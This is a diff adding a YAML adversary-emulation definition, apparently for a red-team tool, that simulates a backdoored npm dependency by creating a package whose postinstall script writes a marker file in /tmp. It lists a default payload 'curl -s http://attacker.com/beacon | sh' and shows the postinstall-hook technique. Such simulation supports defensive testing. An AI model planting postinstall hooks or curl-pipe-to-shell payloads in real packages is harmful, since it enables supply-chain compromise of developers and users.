@@ -1,0 +1,98 @@
+api_version: 2.0
+id: 550e8400-e29b-41d4-a716-446655440022
+platform: darwin
+name: Backdoored dependency injection
+category: Initial Access
+description: Simulate supply chain attack through dependency injection. Malware is injected into legitimate dependency packages used by target applications.
+tactics:
+  - T1195.001
+techniques:
+  - T1195.001
+args:
+  - name: package_name
+    description: Name of the legitimate dependency package
+    type: string
+    default: common_lib
+  - name: version
+    description: Version of the dependency
+    type: string
+    default: "2.5.0"
+  - name: source_repo
+    description: Repository URL where dependency is hosted
+    type: string
+    default: "https://npm.org/package/common_lib"
+  - name: backdoor_payload
+    description: Payload to inject into dependency
+    type: string
+    default: "curl -s http://attacker.com/beacon | sh"
+steps:
+  - name: Create dependency package structure
+    command: mkdir -p /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/node_modules
+    
+  - name: Create package definition
+    command: |
+      cat > /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/package.json << 'PKGJSON'
+      {
+        "name": "{{ package_name }}",
+        "version": "{{ version }}",
+        "description": "Common library",
+        "main": "lib/index.js",
+        "scripts": {
+          "postinstall": "node lib/postinstall.js"
+        }
+      }
+      PKGJSON
+    
+  - name: Create legitimate library code
+    command: |
+      mkdir -p /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/lib
+      cat > /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/lib/index.js << 'LIBJS'
+      module.exports = {
+        version: "{{ version }}",
+        init: function() {
+          console.log("Library initialized");
+        }
+      };
+      LIBJS
+    
+  - name: Create backdoored postinstall script
+    command: |
+      cat > /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/lib/postinstall.js << 'POSTINSTALL'
+      #!/usr/bin/env node
+      const fs = require('fs');
+      const path = require('path');
+      
+      // Write marker file simulating backdoor installation
+      fs.writeFileSync('/tmp/.dependency_backdoor', 'injected', 'utf8');
+      
+      // Simulate silent callback
+      console.log("Postinstall: finalizing setup...");
+      POSTINSTALL
+      chmod +x /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/lib/postinstall.js
+    
+  - name: Simulate dependency installation
+    command: node /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/lib/postinstall.js
+    dry_run: true
+
+checks:
+  - name: Verify backdoor marker file created
+    command: test -f /tmp/.dependency_backdoor
+    expected_output: ""
+    
+  - name: Verify dependency package exists
+    command: test -f /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/package.json
+    expected_output: ""
+    
+  - name: Verify library code present
+    command: test -f /tmp/ttpforge_deps/{{ package_name }}_{{ version }}/lib/index.js
+    expected_output: ""
+
+tests:
+  dry_run: true
+
+cleanup:
+  - name: Remove backdoored dependency package
+    command: rm -rf /tmp/ttpforge_deps/{{ package_name }}_{{ version }}
+    
+  - name: Remove dependency backdoor marker
+    command: rm -f /tmp/.dependency_backdoor
